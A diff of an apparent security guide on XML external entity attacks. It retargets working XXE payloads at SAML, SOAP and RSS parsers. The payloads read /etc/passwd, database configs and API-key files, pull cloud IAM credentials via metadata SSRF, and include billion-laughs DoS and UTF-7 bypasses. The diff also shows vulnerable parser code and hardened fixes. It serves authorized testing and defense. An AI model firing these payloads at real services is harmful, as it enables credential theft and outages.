@@ -38,54 +38,54 @@ Use these in authorized tests when the application parses attacker-controlled XM
 
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE foo [
+<!DOCTYPE saml [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<root>&xxe;</root>
+<saml:Assertion>&xxe;</saml:Assertion>
 ```
 
 ### Pattern 2: Parameter entity (blind / filtered contexts)
 
 ```xml
-<!DOCTYPE foo [
-  <!ENTITY % ext SYSTEM "file:///etc/passwd">
+<!DOCTYPE response [
+  <!ENTITY % ext SYSTEM "file:///var/www/app/config/database.yml">
   %ext;
 ]>
-<root></root>
+<soap:Envelope></soap:Envelope>
 ```
 
 ### Pattern 3: SSRF via external entity URL
 
 ```xml
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+<!DOCTYPE feed [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
 ]>
-<root>&xxe;</root>
+<rss>&xxe;</rss>
 ```
 
 ### Pattern 4: Billion laughs (DoS)
 
 ```xml
-<!DOCTYPE lolz [
-  <!ENTITY lol "lol">
-  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!DOCTYPE invoice [
+  <!ENTITY a "x">
+  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
 ]>
-<root>&lol3;</root>
+<Invoice>&c;</Invoice>
 ```
 
 ### Pattern 5: XInclude file read
 
 ```xml
-<root xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include parse="text" href="file:///etc/passwd"/>
-</root>
+<config xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///app/secrets/api-keys.xml"/>
+</config>
 ```
 
 ### Pattern 6: UTF-7 / encoding bypass (legacy parsers)
 
 ```xml
-+ADw-!DOCTYPE foo +AFs-+AD4-
++ADw-!DOCTYPE saml +AFs-+AD4-
 +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
 ```
 
@@ -159,8 +159,8 @@ xmlCtxtReadDoc(ctxt, buf, NULL, NULL, XML_PARSE_DTDLOAD);
 ```python
 from lxml import etree
 
-def parse_upload(data: bytes):
-    # Attacker-controlled XML body from file upload
+def parse_saml_assertion(data: bytes):
+    # Attacker-controlled SAML XML from SSO callback
     # Sink: external entities may resolve — file read or SSRF
     parser = etree.XMLParser(resolve_entities=True)
     return etree.fromstring(data, parser)
@@ -191,14 +191,14 @@ def parse_upload(data: bytes):
 ### Java
 
 ```java
-public Document parse(InputStream in) throws Exception {
+public Document parseSamlAssertion(InputStream in) throws Exception {
     DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
     // defaults: external entities may be enabled depending on JDK/parser
     DocumentBuilder builder = dbf.newDocumentBuilder();
     return builder.parse(in);
 }
 
-public void transform(InputStream xml, InputStream xsl) throws Exception {
+public void parseSoapEnvelope(InputStream xml, InputStream xsl) throws Exception {
     TransformerFactory tf = TransformerFactory.newInstance();
     Transformer t = tf.newTransformer(new StreamSource(xsl));
     t.transform(new StreamSource(xml), new StreamResult(System.out));
@@ -208,7 +208,7 @@ public void transform(InputStream xml, InputStream xsl) throws Exception {
 ### C#
 
 ```csharp
-public XmlDocument LoadXml(string xml)
+public XmlDocument ParseSamlResponse(string xml)
 {
     var doc = new XmlDocument();
     doc.XmlResolver = new XmlUrlResolver(); // resolves external entities
@@ -216,7 +216,7 @@ public XmlDocument LoadXml(string xml)
     return doc;
 }
 
-public XDocument ParseFeed(Stream stream)
+public XDocument ParseRssFeed(Stream stream)
 {
     return XDocument.Load(stream); // default settings may fetch external DTDs
 }
@@ -225,7 +225,7 @@ public XDocument ParseFeed(Stream stream)
 ### Go
 
 ```go
-func parseWithLib(body []byte) error {
+func parseSoapEnvelope(body []byte) error {
     // Third-party XML libs may expand entities if misconfigured
     doc, err := libxml.Parse(body, libxml.DefaultParserOptions)
     return err
@@ -241,14 +241,14 @@ Use defusedxml or hardened lxml settings. Disable entity resolution and network 
 ```python
 from defusedxml import ElementTree as ET
 
-def parse_upload(data: bytes):
+def parse_saml_assertion(data: bytes):
     return ET.fromstring(data)
 ```
 
 ```python
 from lxml import etree
 
-def parse_upload_hardened(data: bytes):
+def parse_saml_hardened(data: bytes):
     parser = etree.XMLParser(
         resolve_entities=False,
         no_network=True,
@@ -308,8 +308,8 @@ Default `encoding/xml` does not resolve external entities. Audit third-party CGo
 ```go
 import "encoding/xml"
 
-func parseRequest(body []byte) (Envelope, error) {
-    var env Envelope
+func parseSamlAssertion(body []byte) (Assertion, error) {
+    var env Assertion
     if bytes.Contains(body, []byte("<!DOCTYPE")) ||
        bytes.Contains(body, []byte("<!ENTITY")) {
         return env, errors.New("DOCTYPE/ENTITY not allowed")
